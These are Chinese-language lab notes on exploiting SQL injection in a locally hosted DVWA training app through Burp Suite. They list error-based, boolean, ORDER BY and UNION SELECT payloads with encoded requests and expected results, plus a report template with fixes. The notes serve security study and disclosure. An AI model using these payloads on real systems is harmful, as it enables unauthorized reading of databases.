# DVWA 第一阶段学习笔记：Burp Suite + SQL 注入

> 日期：2026-05-15  
> 环境：Kali Linux / Docker / DVWA / Burp Suite Community  
> 目标地址：`http://127.0.0.1:8080`  
> 安全等级：Low  
> 范围：本地 DVWA 靶场，仅用于授权学习和安全测试。

## 说明

本笔记整理第一阶段 DVWA SQL Injection 模块的验证过程、Payload、成功标志、常见错误和报告模板。内容只适用于本地 DVWA、自己的实验环境或明确授权的测试环境。

## 学习总览

本阶段学习内容：

- DVWA 靶场搭建
- Burp Suite 代理配置
- Burp 抓包验证
- SQL 注入基准响应
- SQL 报错测试
- Boolean-based SQL Injection
- `ORDER BY` 字段数判断
- `UNION` 联合查询注入
- 报告写法模板

学习方法：

```text
搭建环境 -> 配置代理 -> 抓取请求 -> 建立基准响应 -> 输入 Payload -> 对比响应 -> 形成证据链
```

## 环境搭建

### 运行 DVWA

使用 Docker 运行 DVWA：

```bash
sudo docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
```

访问地址：

```text
http://127.0.0.1:8080
```

默认账号：

```text
admin / password
```

进入 DVWA 后点击：

```text
Create / Reset Database
```

然后在 `DVWA Security` 中将安全等级设置为：

```text
Low
```

## Burp Suite 配置

Burp Suite 默认代理端口可能和 DVWA 的 `8080` 冲突，可以将 Burp 代理端口改为：

```text
127.0.0.1:8082
```

配置位置：

```text
Proxy -> Proxy settings -> Proxy listeners
```

确认 `127.0.0.1:8082` 处于 `Running` 状态。

使用 Burp 自带浏览器：

```text
Proxy -> Intercept -> Open browser
```

如果 Burp 浏览器提示沙盒错误，在设置中允许无沙盒运行：

```text
Settings -> Burp's browser -> Allow Burp's browser to run without a sandbox
```

## 抓包成功标志

Burp 能看到类似请求：

```http
GET /warmup.html
GET /login.php
GET /vulnerabilities/sqli/?id=1&Submit=Submit
```

说明 Burp 已经成功抓到 DVWA 请求。

## SQL Injection 基准测试

模块位置：

```text
DVWA -> SQL Injection
```

正常输入：

```text
1
```

正常请求示例：

```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
```

正常结果只返回 `ID` 为 `1` 的用户，例如：

```text
ID: 1
First name: admin
Surname: admin
```

说明：这个正常结果是后续测试的基准响应，用来对比 Payload 触发后的页面差异。

## SQL 注入报错测试

核心理解：如果单引号破坏了后端 SQL 语句结构，并让页面返回数据库语法错误，说明用户输入很可能被拼接进 SQL 查询中。

Payload：

```text
1'
```

URL 编码后：

```text
1%27
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1
```

成功现象：

```text
You have an error in your SQL syntax
```

说明：`id` 参数可能存在 SQL 注入风险。

证据链：

```text
输入 1
-> 页面返回 ID 为 1 的用户

输入 1'
-> 页面返回 SQL 语法错误

对比两个响应
-> 单引号影响了后端 SQL 查询结构
```

## Boolean-based SQL Injection

核心理解：通过 true / false 条件对比页面响应差异，判断参数是否可以控制 SQL 查询结果。

### 永真条件测试

Payload：

```text
1' or '1'='1
```

URL 编码：

```text
1%27%20or%20%271%27%3D%271
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27%20or%20%271%27%3D%271&Submit=Submit HTTP/1.1
```

成功现象：页面返回多个用户，例如：

```text
admin / admin
Gordon / Brown
Hack / Me
Pablo / ...
```

说明：`'or '1'='1` 是永真条件，数据库返回了更多记录。

### 永假条件测试

Payload：

```text
1' and '1'='2
```

URL 编码：

```text
1%27%20and%20%271%27%3D%272
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27%20and%20%271%27%3D%272&Submit=Submit HTTP/1.1
```

预期现象：页面不返回用户数据，或者返回内容明显不同。

### 判断链

```text
1'
-> SQL 语法报错

1' or '1'='1
-> 返回多条用户数据

1' and '1'='2
-> 返回为空或响应不同
```

结论：如果以上响应差异成立，可以确认 `id` 参数存在 SQL 注入漏洞。

## ORDER BY 字段数判断

核心理解：`ORDER BY` 可以用于判断当前 SQL 查询结果返回了几列数据，为后续 `UNION SELECT` 做准备。

测试 Payload：

```text
1' order by 1#
1' order by 2#
1' order by 3#
```

URL 编码：

```text
1%27%20order%20by%201%23
1%27%20order%20by%202%23
1%27%20order%20by%203%23
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27%20order%20by%201%23&Submit=Submit HTTP/1.1
GET /vulnerabilities/sqli/?id=1%27%20order%20by%202%23&Submit=Submit HTTP/1.1
GET /vulnerabilities/sqli/?id=1%27%20order%20by%203%23&Submit=Submit HTTP/1.1
```

测试结果：

```text
order by 1 正常
order by 2 正常
order by 3 报错
```

报错内容：

```text
Unknown column '3' in 'order clause'
```

判断链：

```text
order by 1 正常
-> 至少有 1 个字段

order by 2 正常
-> 至少有 2 个字段

order by 3 报错
-> 没有第 3 个字段
```

结论：当前 SQL 查询结果有 `2` 个字段。

## UNION 联合查询注入

核心理解：`UNION SELECT` 可以把构造的数据拼接到原查询结果中，从而验证回显位置并读取数据库信息。

前提：前面已经判断字段数是 `2`，所以 `UNION SELECT` 后面也必须写 `2` 个字段。

### 测试 UNION 是否可用

Payload：

```text
1' union select 1,2#
```

URL 编码：

```text
1%27%20union%20select%201,2%23
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27%20union%20select%201,2%23&Submit=Submit HTTP/1.1
```

预期结果：页面中出现 `1` 和 `2`，说明 `UNION` 注入成功。

### 读取当前数据库名

Payload：

```text
1' union select 1,database()#
```

URL 编码：

```text
1%27%20union%20select%201,database()%23
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27%20union%20select%201,database()%23&Submit=Submit HTTP/1.1
```

预期结果：页面中显示当前数据库名，DVWA 常见为：

```text
dvwa
```

### 读取数据库版本

Payload：

```text
1' union select 1,version()#
```

URL 编码：

```text
1%27%20union%20select%201,version()%23
```

请求示例：

```http
GET /vulnerabilities/sqli/?id=1%27%20union%20select%201,version()%23&Submit=Submit HTTP/1.1
```

预期结果：页面中显示 MySQL / MariaDB 版本信息。

### 判断链

```text
order by 3 报错
-> 字段数量为 2

1' union select 1,2#
-> 页面回显 1 和 2

1' union select 1,database()#
-> 页面显示数据库名

1' union select 1,version()#
-> 页面显示数据库版本
```

结论：DVWA Low 级别 SQL Injection 模块中的 `id` 参数存在 SQL 注入漏洞，并支持 `UNION` 联合查询注入。

## 常见错误总结

### 400 Bad Request

原因：URL 里直接写了空格、换行、`#` 等特殊字符。

解决：使用 URL 编码。

常见编码：

```text
'      -> %27
空格   -> %20
#      -> %23
=      -> %3D
```

### id 参数写错

错误写法：

```text
?id1'orderby1#
```

正确写法：

```text
?id=1%27%20order%20by%201%23
```

注意：

- 必须有 `id=`
- `order by` 中间必须有空格
- `#` 要编码成 `%23`

### Burp 抓不到请求

常见原因：

- 浏览器没有走 Burp 代理
- Burp 代理端口和 DVWA 端口冲突
- Firefox 的 `No proxy for` 中包含 `127.0.0.1` 或 `localhost`

解决方式：

```text
使用 Burp 自带浏览器
或手动设置 Firefox 代理：

HTTP Proxy: 127.0.0.1
Port: 8082
```

同时清空 `No proxy for`。

## 核心概念

- Burp Suite：用于拦截、查看、修改和重放 HTTP 请求，是 Web 渗透测试中的核心工具。
- Repeater：用于重复发送同一个请求，方便测试不同参数和 Payload。
- SQL 注入：后端把用户输入直接拼接进 SQL 语句，导致攻击者可以改变 SQL 查询逻辑。
- 布尔条件测试：通过 true / false 条件对比响应差异，判断参数是否可以控制 SQL 查询结果。
- `ORDER BY`：用于判断当前查询结果有多少个字段，为 `UNION SELECT` 做准备。
- `UNION SELECT`：用于把构造的数据拼接到原查询结果中，从而读取数据库信息。

## Payload 汇总

报错测试：

```text
1'
1%27
```

布尔条件测试：

```text
1' or '1'='1
1%27%20or%20%271%27%3D%271

1' and '1'='2
1%27%20and%20%271%27%3D%272
```

字段数判断：

```text
1' order by 1#
1' order by 2#
1' order by 3#

1%27%20order%20by%201%23
1%27%20order%20by%202%23
1%27%20order%20by%203%23
```

联合查询：

```text
1' union select 1,2#
1' union select 1,database()#
1' union select 1,version()#

1%27%20union%20select%201,2%23
1%27%20union%20select%201,database()%23
1%27%20union%20select%201,version()%23
```

## 报告写法模板

漏洞名称：SQL 注入漏洞

漏洞位置：

```text
/vulnerabilities/sqli/?id=
```

测试环境：DVWA Low 安全等级

漏洞类型：

```text
Boolean-based SQL Injection
UNION-based SQL Injection
```

测试 Payload：

```text
1'
1' or '1'='1
1' and '1'='2
1' order by 1#
1' order by 2#
1' order by 3#
1' union select 1,2#
1' union select 1,database()#
1' union select 1,version()#
```

验证结果：

- 输入单引号后页面返回 SQL 语法错误。
- 输入永真条件后页面返回多条用户数据。
- 输入永假条件后页面返回结果不同。
- `order by 3` 报错，确认字段数量为 `2`。
- `union select 1,2` 成功回显。
- `database()` 和 `version()` 可读取数据库信息。

风险影响：攻击者可能通过构造 SQL 语句读取数据库中的敏感信息，进一步枚举表名、字段名和用户数据。

修复建议：

1. 使用预编译语句或参数化查询。
2. 不要将用户输入直接拼接进 SQL 语句。
3. 对输入参数进行严格类型校验。
4. 关闭生产环境数据库错误回显。
5. 使用最小权限数据库账号。
6. 增加日志监控和异常请求告警。

## 下次学习建议

下一阶段可以继续学习：

1. `information_schema` 枚举表名
2. 枚举字段名
3. 读取 `users` 表数据
4. SQLMap 在 DVWA 中的使用
5. DVWA Medium 安全等级 SQL 注入
6. XSS Reflected 模块
7. 文件上传漏洞模块

## 安全边界

所有练习仅限：

- 本地 DVWA 靶场
- 自己的实验环境
- 明确授权的测试环境

不要用于：

- 未授权网站
- 公网目标
- 真实账号
- 真实业务系统

不要进行：

- 未授权扫描或测试
- 爆破
- 漏洞利用
- 数据导出
- 破坏或修改数据
